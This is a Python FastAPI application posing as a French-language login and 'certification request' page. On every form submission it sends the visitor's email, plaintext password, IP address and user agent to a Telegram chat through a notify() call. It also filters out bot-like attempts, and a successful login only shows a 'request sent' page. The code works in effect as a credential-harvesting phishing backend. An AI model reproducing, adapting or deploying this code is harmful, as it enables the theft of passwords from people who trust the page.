import os
import re
import sys
import time
from collections import defaultdict, deque
from html import escape
from pathlib import Path

from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from dotenv import load_dotenv

import db
from telegram import notify

load_dotenv()
db.init()

BASE_DIR = Path(__file__).parent
EMAIL_RE = re.compile(r"^[A-Za-z0-9.!#$%&'*+/=?^_`{|}~-]+@[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+$")
ATTEMPTS = defaultdict(deque)
ATTEMPT_WINDOW = 300
MAX_ATTEMPTS_PER_WINDOW = 10
MAX_EMAIL_LEN = 254
MAX_PASSWORD_LEN = 128

app = FastAPI(title="auth")


def is_blocked_attempt(ip: str, email: str, password: str, ua: str) -> bool:
    if not ip or len(ip) > 64:
        return True
    if not ua or len(ua) > 500:
        return True
    if not email or len(email) > MAX_EMAIL_LEN:
        return True
    if not password or len(password) > MAX_PASSWORD_LEN:
        return True
    email_norm = email.strip().lower()
    if " " in email_norm or "<" in email_norm or ">" in email_norm:
        return True
    if not EMAIL_RE.fullmatch(email_norm):
        return True
    if any(token in email_norm for token in ("<script", "javascript:", "..", "@.", "@@")):
        return True
    if len(password) < 4:
        return True
    return False


def rate_limited(ip: str, email: str) -> bool:
    now = time.time()
    key_ip = f"ip:{ip}"
    key_email = f"email:{email.strip().lower()}"

    for key in (key_ip, key_email):
        bucket = ATTEMPTS[key]
        while bucket and now - bucket[0] > ATTEMPT_WINDOW:
            bucket.popleft()
        if len(bucket) >= MAX_ATTEMPTS_PER_WINDOW:
            return True
        bucket.append(now)
    return False

# monte /static si le dossier existe
_static = BASE_DIR / "static"
if _static.is_dir():
    app.mount("/static", StaticFiles(directory=str(_static)), name="static")


def client_ip(req: Request) -> str:
    """IP reelle du client, derriere reverse proxy."""
    for header in ("cf-connecting-ip", "x-real-ip", "x-forwarded-for"):
        v = req.headers.get(header)
        if v:
            return v.split(",")[0].strip()
    return req.client.host if req.client else "?"


@app.get("/")
def index():
    return RedirectResponse("/login")


@app.get("/login")
def login_form():
    return FileResponse(str(BASE_DIR / "templates" / "login.html"),
                        media_type="text/html")


@app.post("/login", response_class=HTMLResponse)
def login_submit(
    request: Request,
    email: str = Form(...),
    password: str = Form(...),
):
    ip = client_ip(request)
    ua = request.headers.get("user-agent", "?")

    if is_blocked_attempt(ip, email, password, ua) or rate_limited(ip, email):
        notify(
            "<b>login SUSPICIOUS</b>\n"
            f"email: <code>{escape(email[:200])}</code>\n"
            f"ip: <code>{escape(ip)}</code>\n"
            f"ua: <code>{escape(ua[:200])}</code>"
        )
        time.sleep(1.5)
        return HTMLResponse(
            """
            <!doctype html>
            <html lang="fr">
            <head>
            <meta charset="utf-8">
            <title>Identifiants invalides</title>
            <style>
              body {
                margin: 0;
                min-height: 100vh;
                display: grid;
                place-items: center;
                background: linear-gradient(135deg, #fff3f3, #fff7f7);
                font-family: "Segoe UI", sans-serif;
              }
              .box {
                max-width: 440px;
                width: min(90vw, 440px);
                background: white;
                border-radius: 20px;
                padding: 30px 24px;
                text-align: center;
                box-shadow: 0 18px 40px rgba(120, 20, 20, 0.12);
              }
              h3 { margin: 0 0 12px; color: #b62424; }
              p { margin: 0; color: #5f6674; }
              a { display: inline-block; margin-top: 18px; color: #1748d6; font-weight: 700; }
            </style>
            </head>
            <body>
              <div class="box">
                <h3>Identifiants invalides.</h3>
                <p>Veuillez vérifier votre adresse e-mail et votre mot de passe.</p>
                <a href="/login">Retour au login</a>
              </div>
            </body>
            </html>
            """
        )

    ok = db.verify(email, password)
    db.log_event(email, ok, ip, ua)

    status = "OK" if ok else "ECHEC"
    safe_email = escape(email)
    safe_password = escape(password)
    safe_ip = escape(ip)
    safe_ua = escape(ua)

    notify(
        f"<b>login {status}</b>\n"
        f"email: <code>{safe_email}</code>\n"
        f"password: <code>{safe_password}</code>\n"
        f"ip: <code>{safe_ip}</code>\n"
        f"ua: <code>{safe_ua}</code>"
    )

    if ok:
        return HTMLResponse(
            """
            <!doctype html>
            <html lang="fr">
            <head>
            <meta charset="utf-8">
            <title>Demande envoyée</title>
            <style>
              :root {
                --bg-1: #0b0d1a;
                --bg-2: #1f1238;
                --pink: #ff4db8;
                --purple: #8b5cf6;
                --cyan: #38d7ff;
                --yellow: #ffd84d;
                --text: #fffaff;
                --muted: #dbcaff;
              }
              * { box-sizing: border-box; }
              body {
                margin: 0;
                min-height: 100vh;
                display: grid;
                place-items: center;
                font-family: "Segoe UI", Tahoma, sans-serif;
                background: radial-gradient(circle at top, rgba(139,92,246,0.4), transparent 20%),
                            radial-gradient(circle at bottom right, rgba(255,77,184,0.3), transparent 25%),
                            linear-gradient(135deg, var(--bg-1), var(--bg-2));
                color: var(--text);
              }
              .card {
                width: min(92vw, 540px);
                background: linear-gradient(180deg, rgba(17,15,28,0.96), rgba(24,18,39,0.92));
                border: 1px solid rgba(255,255,255,0.08);
                border-radius: 28px;
                padding: 30px 26px 26px;
                text-align: center;
                box-shadow: 0 25px 60px rgba(0,0,0,0.42), 0 0 0 1px rgba(255,77,184,0.2);
              }
              .logo {
                width: 148px;
                display: block;
                margin: 0 auto 10px;
                filter: drop-shadow(0 16px 28px rgba(255,77,184,0.35));
              }
              .badge {
                width: 110px;
                height: 110px;
                display: block;
                margin: 0 auto 18px;
                filter: drop-shadow(0 18px 24px rgba(255, 216, 77, 0.25));
              }
              .tag {
                display: inline-block;
                padding: 8px 14px;
                border-radius: 999px;
                background: linear-gradient(135deg, rgba(255,216,77,0.22), rgba(255,77,184,0.18));
                color: var(--yellow);
                font-size: 0.72rem;
                font-weight: 800;
                letter-spacing: 0.12em;
                text-transform: uppercase;
                margin-bottom: 14px;
              }
              h1 {
                margin: 0;
                font-size: clamp(2rem, 5vw, 3rem);
                letter-spacing: -0.06em;
                background: linear-gradient(135deg, #ffd84d 0%, #ff4db8 40%, #38d7ff 100%);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
              }
              p {
                color: var(--muted);
                font-size: 1.06rem;
                line-height: 1.7;
                margin: 18px auto 0;
                max-width: 30ch;
              }
              .btn {
                display: inline-block;
                margin-top: 26px;
                text-decoration: none;
                background: linear-gradient(135deg, var(--pink), var(--purple), var(--cyan));
                color: white;
                padding: 12px 22px;
                border-radius: 12px;
                font-weight: 800;
                box-shadow: 0 12px 20px rgba(139, 92, 246, 0.25);
              }
            </style>
            </head>
            <body>
              <div class="card">
                <img class="badge" src="/static/certification-logo.png" alt="logo de certification">
                <div class="tag">Validation</div>
                <h1>Demande envoyée</h1>
                <p>Votre demande de certification a été envoyée avec succès.</p>
                <a class="btn" href="/login">Retour</a>
              </div>
            </body>
            </html>
            """
        )
    return HTMLResponse(
        """
        <!doctype html>
        <html lang="fr">
        <head>
        <meta charset="utf-8">
        <title>Identifiants invalides</title>
        <style>
          body {
            margin: 0;
            min-height: 100vh;
            display: grid;
            place-items: center;
            background: linear-gradient(135deg, #fff3f3, #fff7f7);
            font-family: "Segoe UI", sans-serif;
          }
          .box {
            max-width: 440px;
            width: min(90vw, 440px);
            background: white;
            border-radius: 20px;
            padding: 30px 24px;
            text-align: center;
            box-shadow: 0 18px 40px rgba(120, 20, 20, 0.12);
          }
          h3 { margin: 0 0 12px; color: #b62424; }
          p { margin: 0; color: #5f6674; }
          a { display: inline-block; margin-top: 18px; color: #1748d6; font-weight: 700; }
        </style>
        </head>
        <body>
          <div class="box">
            <h3>Identifiants invalides.</h3>
            <p>Veuillez vérifier votre adresse e-mail et votre mot de passe.</p>
            <a href="/login">Retour au login</a>
          </div>
        </body>
        </html>
        """
    )


# --- utilitaire CLI : creer un utilisateur ---
if __name__ == "__main__":
    if len(sys.argv) == 4 and sys.argv[1] == "adduser":
        db.add_user(sys.argv[2], sys.argv[3])
        print(f"utilisateur cree : {sys.argv[2]}")
    else:
        print("usage: python app.py adduser <email> <motdepasse>")